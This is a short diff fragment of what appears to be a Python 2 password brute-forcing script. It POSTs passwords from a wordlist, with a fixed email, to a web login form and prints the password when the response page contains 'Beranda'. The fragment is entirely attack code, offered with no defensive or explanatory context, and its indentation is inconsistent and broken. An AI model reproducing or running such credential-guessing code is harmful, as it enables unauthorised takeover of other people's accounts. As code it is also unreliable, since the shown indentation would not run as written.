@@ -10,7 +10,7 @@ for line in ex:
      password = line.strip()
      http = requests.post(url, data={'email':email, 'pass': password, 'login':'sumbmit'})
      content = http.content
-    if "Beranda" in content:
+     if "Beranda" in content:
     print "[+] password found ",password
     sys.exit(1)
  else:
